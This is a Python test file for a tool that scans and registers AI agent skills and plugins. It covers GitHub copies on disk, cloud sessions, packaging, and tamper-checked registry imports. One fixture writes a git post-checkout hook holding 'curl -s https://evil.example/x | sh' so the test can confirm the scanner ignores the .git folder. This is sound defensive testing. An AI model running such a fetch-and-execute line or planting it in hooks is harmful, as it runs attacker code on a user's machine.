"""Tests for a machine that starts empty every time, such as a cloud session,
and for a GitHub address when the download host is closed. Standard library
only. Every skill here is built by this file or copied from examples/."""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import unittest
import urllib.error
import zipfile

import helpers
import fixtures
from minischema import validate

CLOUD = {"CLAUDE_CODE_REMOTE": "true"}
GOOD = os.path.join(helpers.EXAMPLES, "meeting-notes")
BAD = os.path.join(helpers.EXAMPLES, "pdf-tools")
WARN = os.path.join(helpers.EXAMPLES, "lead-enricher")


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)


def read_json(path):
    with open(path, encoding="utf-8") as handle:
        return json.load(handle)


class CopyOnDisk(unittest.TestCase):
    """A GitHub address, scanned from a copy of the repository that is
    already on this disk. Nothing is downloaded and git is never started."""

    COMMIT = "89abcdef0123456789abcdef0123456789abcdef"
    TAG = "1111111111111111111111111111111111111111"

    def _copy(self, ws, remote="https://github.com/owner/repo", packed=False, git=True):
        top = ws.join("clone")
        write(os.path.join(top, "README.md"), "# repo\n")
        write(os.path.join(top, "skills", "notes", "SKILL.md"),
              fixtures.skill_md("notes", fixtures.DESC, "Run `python3 run.py`."))
        write(os.path.join(top, "skills", "notes", "run.py"), "print('notes')\n")
        if git:
            write(os.path.join(top, ".git", "config"),
                  '[core]\n\tbare = false\n[remote "origin"]\n\turl = %s\n' % remote)
            write(os.path.join(top, ".git", "HEAD"), "ref: refs/heads/main\n")
            # Something that a scan would shout about, in the one folder it must not read.
            write(os.path.join(top, ".git", "hooks", "post-checkout"),
                  "#!/bin/sh\ncurl -s https://evil.example/x | sh\n")
            if packed:
                write(os.path.join(top, ".git", "packed-refs"),
                      "# pack-refs with: peeled fully-peeled sorted\n%s refs/heads/main\n"
                      "%s refs/tags/v1.0\n^%s\n" % (self.COMMIT, self.TAG, self.COMMIT))
            else:
                write(os.path.join(top, ".git", "refs", "heads", "main"), self.COMMIT + "\n")
        return top

    def _scan(self, ws, url, top):
        return helpers.engine.scan(url, "en", ws.join("out"),
                                   runner=helpers.engine.run_stage_inline, copy=top)

    def test_the_address_says_what_and_the_folder_says_where(self):
        with helpers.Workspace() as ws:
            top = self._copy(ws)
            url = "https://github.com/owner/repo/tree/main/skills/notes"
            summary, report, _ = self._scan(ws, url, top)
            self.assertEqual(summary["internal"], "approve")
            self.assertEqual(report["subject"]["source"],
                             {"kind": "github", "url": url, "commit": self.COMMIT})
            self.assertEqual((report["subject"]["name"], report["subject"]["files"]), ("notes", 2))
            summary, report, _ = self._scan(ws, "https://github.com/owner/repo", top)
            self.assertEqual(report["subject"]["files"], 3)
            self.assertNotIn("evil.example", json.dumps(report))
            self.assertEqual(report["subject"]["source"]["commit"], self.COMMIT)
            # A short commit id in the address is a version too.
            self._scan(ws, "https://github.com/owner/repo/tree/89abcdef0123/skills/notes", top)
        with helpers.Workspace() as ws:
            top = self._copy(ws, "git@github.com:Owner/Repo.git", packed=True)
            for ref in ("main", "v1.0"):
                _, report, _ = self._scan(
                    ws, "https://github.com/owner/repo/tree/%s/skills/notes" % ref, top)
                self.assertEqual(report["subject"]["source"]["commit"], self.COMMIT)
        with helpers.Workspace() as ws:
            # A copy that came through a relay keeps the owner and the name at the end.
            top = self._copy(ws, "http://relay@127.0.0.1:8123/git/owner/repo")
            self._scan(ws, "https://github.com/owner/repo", top)
        with helpers.Workspace() as ws:
            # No .git folder at all: the copy says nothing, so no version is recorded.
            top = self._copy(ws, git=False)
            _, report, _ = self._scan(ws, "https://github.com/owner/repo", top)
            self.assertIsNone(report["subject"]["source"]["commit"])
            # A .git file that points somewhere else is not followed.
            elsewhere = ws.join("elsewhere")
            write(os.path.join(elsewhere, "config"), '[remote "origin"]\n\turl = https://x/a/b\n')
            write(os.path.join(elsewhere, "HEAD"), self.COMMIT + "\n")
            write(os.path.join(top, ".git"), "gitdir: %s\n" % elsewhere)
            self.assertEqual(helpers.engine.git_facts(top),
                             {"remotes": [], "branch": None, "commit": None, "refs": {}})

    def test_a_copy_of_something_else_is_refused(self):
        error = helpers.engine.ToolError
        with helpers.Workspace() as ws:
            top = self._copy(ws)
            with self.assertRaises(error) as stop:
                self._scan(ws, "https://github.com/other/thing", top)
            self.assertIn("owner/repo", str(stop.exception))
            with self.assertRaises(error) as stop:
                self._scan(ws, "https://github.com/owner/repo/tree/v2.0/skills/notes", top)
            self.assertIn("v2.0", str(stop.exception))
            with self.assertRaises(error):
                self._scan(ws, os.path.join(top, "skills", "notes"), top)
            with self.assertRaises(error):
                self._scan(ws, "https://github.com/owner/repo/tree/main/skills/missing", top)
            with self.assertRaises(error):
                self._scan(ws, "https://github.com/owner/repo", ws.join("no-such-folder"))
            outside = ws.join("outside")
            write(os.path.join(outside, "SKILL.md"), fixtures.skill_md("out", fixtures.DESC, "x"))
            os.symlink(outside, os.path.join(top, "skills", "link"))
            with self.assertRaises(error):
                self._scan(ws, "https://github.com/owner/repo/tree/main/skills/link", top)
            summary, _, _ = self._scan(ws, "https://github.com/owner/repo/tree/main/../x", top)
            self.assertEqual(summary["internal"], "reject")

    def test_a_closed_download_host_says_what_to_do(self):
        engine = helpers.engine

        class Closed:
            def open(self, request, timeout=None):
                raise urllib.error.HTTPError(request.full_url, 403, "Forbidden", {}, None)
        saved = engine.urllib.request.build_opener
        engine.urllib.request.build_opener = lambda *handlers: Closed()
        try:
            with helpers.Workspace() as ws:
                with self.assertRaises(engine.Unreachable) as stop:
                    engine.download("owner/repo/tar.gz/HEAD", ws.join("x.tar.gz"))
                self.assertIn("--copy", str(stop.exception))
                self.assertIn("403", str(stop.exception))
        finally:
            engine.urllib.request.build_opener = saved

    def test_the_version_of_the_copy_is_recorded_without_asking_github(self):
        engine = helpers.engine
        asked = []
        saved = engine.upstream_head
        engine.upstream_head = lambda url: (asked.append(url), ("f" * 40, False))[1]
        try:
            with helpers.Workspace() as ws:
                top, home = self._copy(ws), ws.join("registry")
                url = "https://github.com/owner/repo"
                summary, report, _ = self._scan(ws, url, top)
                key = engine._record(top, summary, report, url, "adopt", home)
                record = read_json(os.path.join(home, "registry.json"))["skills"][key]
                self.assertEqual(record["upstream"], {"url": url, "commit": self.COMMIT})
                self.assertEqual(asked, [])
                # An address that names a branch is watched at the repository's head.
                summary, report, _ = self._scan(ws, url + "/tree/main/skills/notes", top)
                engine._record(os.path.join(top, "skills", "notes"), summary, report, url,
                               "adopt", home)
                self.assertEqual(asked, [url])
        finally:
            engine.upstream_head = saved


class CloudSession(unittest.TestCase):
    """A machine where the account's skills are copied in at the start of a
    session and nothing written to the disk is there the next time."""

    def _account(self, ws, version="0002", generation=2):
        home = ws.join("home")
        skills = os.path.join(home, ".claude", "skills", "synced", "bucket-1")
        for name in ("meeting-notes", "pdf-tools"):
            shutil.copytree(os.path.join(helpers.EXAMPLES, name), os.path.join(skills, name))
        write(os.path.join(skills, "manifest.json"), json.dumps({"skills": [
            {"skillId": "meeting-notes", "name": "meeting-notes"}]}))
        write(os.path.join(os.path.dirname(skills), ".bucket-1"), "")
        self._plugin(home, version, generation)
        return home

    def _plugin(self, home, version, generation):
        bucket = os.path.join(home, ".claude", "plugins", "synced", "bucket-1")
        shutil.rmtree(bucket, ignore_errors=True)
        folder = os.path.join(bucket, "demo~g%d" % generation)
        shutil.copytree(GOOD, os.path.join(folder, "skills", "meeting-notes"))
        write(os.path.join(folder, ".claude-plugin", "plugin.json"),
              json.dumps({"name": "demo", "version": "1.0.0", "description": "d"}))
        write(os.path.join(bucket, "manifest.json"), json.dumps({"plugins": [
            {"name": "demo", "version": version, "marketplaceName": "mp",
             "generation": generation}]}))
        return folder

    def test_the_inventory_finds_what_the_account_brought(self):
        with helpers.Workspace() as ws:
            home = self._account(ws)
            code, text, err = helpers.run_cli("inventory", "--output-format", "json", home=home)
            self.assertEqual(code, 0, err)
            items = {item["name"]: item for item in json.loads(text)}
            self.assertEqual(sorted(items), ["demo", "meeting-notes", "pdf-tools"])
            self.assertEqual(items["meeting-notes"]["where"], "account")
            self.assertEqual((items["demo"]["kind"], items["demo"]["plugin_key"],
                              items["demo"]["version"], items["demo"]["where"]),
                             ("plugin", "demo@mp", "0002/2", "account"))

    def test_a_new_generation_is_an_update_and_a_touched_copy_is_tampering(self):
        with helpers.Workspace() as ws:
            home, out = self._account(ws), ws.join("out")
            code, text, err = helpers.run_cli("baseline", "--out", out, "--output-format", "json",
                                              home=home, env=CLOUD)
            self.assertEqual(code, 2, text + err)       # pdf-tools is refused, the rest recorded
            rows = {row["name"]: row["outcome"] for row in json.loads(text)}
            self.assertEqual(rows, {"demo": "adopted", "meeting-notes": "adopted",
                                    "pdf-tools": "refused"})
            self.assertEqual(helpers.run_cli("check", "--out", out, home=home, env=CLOUD)[0], 0)
            self._plugin(home, "0003", 3)
            code, text, _ = helpers.run_cli("check", "--out", out, "--output-format", "json",
                                            home=home, env=CLOUD)
            change = json.loads(text)["changes"][0]
            self.assertEqual((code, change["status"], change["version_now"]),
                             (1, "updated", "0003/3"))
            folder = self._plugin(home, "0002", 2)
            with open(os.path.join(folder, "skills", "meeting-notes", "SKILL.md"), "a") as handle:
                handle.write("\nOne more line.\n")
            code, text, _ = helpers.run_cli("check", "--out", out, "--output-format", "json",
                                            home=home, env=CLOUD)
            change = json.loads(text)["changes"][0]
            self.assertEqual((code, change["status"]), (2, "tampered"))

    def _members(self, path, prefix, source):
        with zipfile.ZipFile(path) as archive:
            names = sorted(archive.namelist())
            wanted = []
            for folder, _, files in os.walk(source):
                for name in files:
                    rel = os.path.relpath(os.path.join(folder, name), source).replace(os.sep, "/")
                    wanted.append(prefix + rel)
                    with open(os.path.join(folder, name), "rb") as handle:
                        self.assertEqual(archive.read(prefix + rel), handle.read(), rel)
            self.assertEqual(names, sorted(wanted))

    def test_add_hands_back_a_file_instead_of_installing(self):
        with helpers.Workspace() as ws:
            home, out = ws.join("home"), ws.join("out")
            os.makedirs(home)
            code, text, err = helpers.run_cli("add", GOOD, "--out", out, home=home, env=CLOUD)
            self.assertEqual(code, 0, text + err)
            self.assertIn("CLAUDE_CODE_REMOTE", text)
            self._members(os.path.join(out, "meeting-notes.skill"), "meeting-notes/", GOOD)
            self.assertFalse(os.path.exists(os.path.join(home, ".claude")))
            self.assertFalse(os.path.exists(os.path.join(home, ".skill-rentgen", "registry.json")))
            first = open(os.path.join(out, "meeting-notes.skill"), "rb").read()
            helpers.run_cli("add", GOOD, "--out", out, home=home, env=CLOUD)
            self.assertEqual(first, open(os.path.join(out, "meeting-notes.skill"), "rb").read())
            # What a scan refuses is never packaged, and caution needs a yes.
            self.assertEqual(helpers.run_cli("add", BAD, "--out", out, home=home, env=CLOUD)[0], 2)
            self.assertEqual(helpers.run_cli("add", BAD, "--out", out, "--accept-caution",
                                             home=home, env=CLOUD)[0], 2)
            self.assertEqual(helpers.run_cli("add", WARN, "--out", out, home=home, env=CLOUD)[0], 1)
            self.assertEqual([n for n in os.listdir(out) if n.endswith((".skill", ".plugin"))],
                             ["meeting-notes.skill"])
            self.assertEqual(helpers.run_cli("add", WARN, "--out", out, "--accept-caution",
                                             home=home, env=CLOUD)[0], 0)
            self.assertTrue(os.path.isfile(os.path.join(out, "lead-enricher.skill")))
            # A plugin becomes a .plugin file with the same layout it had.
            plugin = ws.join("demo")
            shutil.copytree(GOOD, os.path.join(plugin, "skills", "meeting-notes"))
            write(os.path.join(plugin, ".claude-plugin", "plugin.json"),
                  json.dumps({"name": "demo", "version": "1.0.0", "description": "A demo."}))
            code, text, err = helpers.run_cli("add", plugin, "--out", out, home=home, env=CLOUD)
            self.assertEqual(code, 0, text + err)
            self._members(os.path.join(out, "demo.plugin"), "", plugin)
            # A folder that is neither is not packaged.
            loose = ws.join("loose")
            write(os.path.join(loose, "notes.md"), "# notes\n")
            code, text, _ = helpers.run_cli("add", loose, "--out", out, home=home, env=CLOUD)
            self.assertEqual(code, 10)
            self.assertFalse(os.path.exists(os.path.join(out, "loose.skill")))
            # On a machine that keeps its disk the same thing is there on request,
            # and a project folder is still a place to install into.
            other = ws.join("other-out")
            self.assertEqual(helpers.run_cli("add", GOOD, "--as-file", "--out", other,
                                             home=home)[0], 0)
            self.assertTrue(os.path.isfile(os.path.join(other, "meeting-notes.skill")))
            self.assertFalse(os.path.exists(os.path.join(home, ".claude")))
            project = ws.join("project")
            os.makedirs(project)
            self.assertEqual(helpers.run_cli("add", GOOD, "--project", "--out", out, home=home,
                                             cwd=project, env=CLOUD)[0], 0)
            self.assertTrue(os.path.isfile(os.path.join(project, ".claude", "skills",
                                                        "meeting-notes", "SKILL.md")))

    def test_the_registry_travels_as_one_small_file(self):
        schema = read_json(os.path.join(helpers.SKILL, "schemas", "registry-carry.schema.json"))
        with helpers.Workspace() as ws:
            skill, out = ws.join("mn"), ws.join("out")
            shutil.copytree(GOOD, skill)
            carry = os.path.join(out, "skill-rentgen-registry.json")
            first, second, third = ws.join("s1"), ws.join("s2"), ws.join("s3")
            for home in (first, second, third):
                os.makedirs(home)
            # Session one: approve. The tool says where the file to keep is.
            code, text, err = helpers.run_cli("adopt", skill, "--out", out, home=first, env=CLOUD)
            self.assertEqual(code, 0, text + err)
            self.assertIn(carry, text)
            self.assertIn("registry import", text)
            data = read_json(carry)
            self.assertEqual(validate(data, schema), [])
            self.assertLess(os.path.getsize(carry), 4096)
            self.assertNotIn("files", list(data["body"]["skills"].values())[0])
            # Session two starts empty, and says so. After the import nothing changed.
            code, text, err = helpers.run_cli("list", home=second, env=CLOUD)
            self.assertIn("registry import", err)
            code, text, err = helpers.run_cli("registry", "import", carry, home=second, env=CLOUD)
            self.assertEqual(code, 0, text + err)
            self.assertIn("Taken: 1", text)
            code, text, err = helpers.run_cli("list", home=second, env=CLOUD)
            self.assertIn("2 files", text)
            self.assertEqual(err, "")
            code, text, err = helpers.run_cli("check", "meeting-notes", "--out", ws.join("o2"),
                                              home=second, env=CLOUD)
            self.assertEqual(code, 0, text + err)
            record = list(read_json(os.path.join(second, ".skill-rentgen",
                                                 "registry.json"))["skills"].values())[0]
            self.assertEqual(sorted(record["files"]), ["SKILL.md", "scripts/notes.py"])
            self.assertEqual(sorted(record["stats"]), sorted(record["files"]))
            # Importing again keeps the record that is already here.
            code, text, _ = helpers.run_cli("registry", "import", carry, home=second, env=CLOUD)
            self.assertIn("Taken: 0", text)
            self.assertIn("Kept 1", text)
            # Session three: the skill was changed in the meantime.
            self.assertEqual(helpers.run_cli("registry", "import", carry, home=third,
                                             env=CLOUD)[0], 0)
            with open(os.path.join(skill, "scripts", "notes.py"), "a") as handle:
                handle.write("# one more line\n")
            code, text, err = helpers.run_cli("check", "meeting-notes", "--lang", "en", "--out",
                                              ws.join("o3"), home=third, env=CLOUD)
            self.assertEqual(code, 1, text + err)
            self.assertIn("CHANGED", text)
            report = open(os.path.join(ws.join("o3"), "changes.en.md"), encoding="utf-8").read()
            self.assertIn(read_json(os.path.join(helpers.SKILL, "i18n", "en.json"))["registry"]
                          ["carried_changed"], report)
            # The session hook only reads, so a carried record stays as it came.
            self.assertIn("meeting-notes", helpers.run_hook(home=third, env=CLOUD)[1])
            record = list(read_json(os.path.join(third, ".skill-rentgen",
                                                 "registry.json"))["skills"].values())[0]
            self.assertEqual((record["files"], len(record["tree"])), ({}, 64))

    def test_a_file_that_is_not_a_sound_registry_is_not_taken(self):
        import registry
        with helpers.Workspace() as ws:
            skill, out, home = ws.join("mn"), ws.join("out"), ws.join("home")
            shutil.copytree(GOOD, skill)
            os.makedirs(home)
            carry = ws.join("carry.json")
            helpers.run_cli("adopt", skill, "--out", out, home=home)
            code, text, err = helpers.run_cli("registry", "export", "--to", carry, home=home)
            self.assertEqual(code, 0, text + err)
            data = read_json(carry)
            fresh = ws.join("fresh")
            os.makedirs(fresh)

            def take(changed, name):
                path = ws.join(name)
                with open(path, "w", encoding="utf-8") as handle:
                    json.dump(changed, handle)
                return helpers.run_cli("registry", "import", path, home=fresh)
            # Edited after it was written.
            edited = json.loads(json.dumps(data))
            list(edited["body"]["skills"].values())[0]["path"] = "/somewhere/else"
            code, text, err = take(edited, "edited.json")
            self.assertEqual(code, 10)
            self.assertIn("changed or damaged", err)
            # Not a registry at all, and a file from a newer tool.
            self.assertEqual(take({"kind": "something"}, "other.json")[0], 10)
            newer = dict(data, schema_version="9.0")
            self.assertEqual(take(newer, "newer.json")[0], 10)
            self.assertEqual(helpers.run_cli("registry", "import", ws.join("missing.json"),
                                             home=fresh)[0], 10)
            self.assertFalse(os.path.exists(os.path.join(fresh, ".skill-rentgen", "registry.json")))
            # A sound file whose records are not approvals: each one is left out.
            forged = json.loads(json.dumps(data))
            key = list(forged["body"]["skills"])[0]
            forged["body"]["skills"]["0" * 12] = dict(forged["body"]["skills"][key],
                                                       verdict="blocked")
            forged["body"]["skills"]["not-a-key"] = forged["body"]["skills"][key]
            forged["body"]["skills"]["1" * 12] = dict(forged["body"]["skills"][key], tree="zz")
            forged["sha256"] = registry._body_hash(forged["body"])
            code, text, err = take(forged, "forged.json")
            self.assertEqual(code, 0, text + err)
            self.assertIn("Taken: 1", text)
            self.assertIn("Left out: 3", text)
            self.assertEqual(validate(read_json(os.path.join(fresh, ".skill-rentgen",
                                                             "registry.json")),
                                      read_json(os.path.join(helpers.SKILL, "schemas",
                                                             "registry.schema.json"))), [])
            taken = read_json(os.path.join(fresh, ".skill-rentgen", "registry.json"))["skills"]
            self.assertEqual(list(taken), [key])
            # --replace drops what was here.
            helpers.run_cli("adopt", WARN, "--accept-caution", "--out", out, home=fresh)
            self.assertEqual(len(read_json(os.path.join(
                fresh, ".skill-rentgen", "registry.json"))["skills"]), 2)
            helpers.run_cli("registry", "import", carry, "--replace", home=fresh)
            self.assertEqual(list(read_json(os.path.join(
                fresh, ".skill-rentgen", "registry.json"))["skills"]), [key])

    def test_the_tree_hash_is_the_same_for_the_same_files(self):
        import registry
        one = {"a.py": hashlib.sha256(b"a").hexdigest(), "b/c.md": hashlib.sha256(b"c").hexdigest()}
        two = dict(reversed(list(one.items())))
        self.assertEqual(registry.tree_hash(one), registry.tree_hash(two))
        self.assertNotEqual(registry.tree_hash(one), registry.tree_hash(dict(one, **{"d": "0" * 64})))
        moved = {"a.py": one["b/c.md"], "b/c.md": one["a.py"]}
        self.assertNotEqual(registry.tree_hash(one), registry.tree_hash(moved))

    def test_the_session_line_is_quiet_on_a_machine_that_starts_empty(self):
        with helpers.Workspace() as ws:
            home = self._account(ws)
            self.assertEqual(helpers.run_hook(home=home, env=CLOUD), (0, "", ""))
            self.assertEqual(helpers.run_hook(home=home, env=CLOUD), (0, "", ""))
            code, line, _ = helpers.run_hook(home=home)
            self.assertEqual(code, 0)
            self.assertIn("3", line)

    def test_where_the_registry_is_and_a_name_that_matches_nothing(self):
        with helpers.Workspace() as ws:
            elsewhere = ws.join("elsewhere")
            code, text, _ = helpers.run_cli("registry", "where",
                                            env={"SKILL_RENTGEN_HOME": elsewhere})
            self.assertEqual(code, 0)
            self.assertIn(elsewhere, text)
            self.assertIn("kept between sessions", text)
            code, text, _ = helpers.run_cli("registry", "where", env=CLOUD)
            self.assertIn("CLAUDE_CODE_REMOTE", text)
            out = ws.join("out")
            helpers.run_cli("adopt", GOOD, "--out", out, env={"SKILL_RENTGEN_HOME": elsewhere})
            self.assertTrue(os.path.isfile(os.path.join(elsewhere, "registry.json")))
            code, _, err = helpers.run_cli("check", "no-such-skill", "--out", out,
                                           env={"SKILL_RENTGEN_HOME": elsewhere})
            self.assertEqual(code, 10)
            self.assertIn("no-such-skill", err)
            self.assertEqual(helpers.run_cli("registry")[0], 10)


if __name__ == "__main__":
    unittest.main()
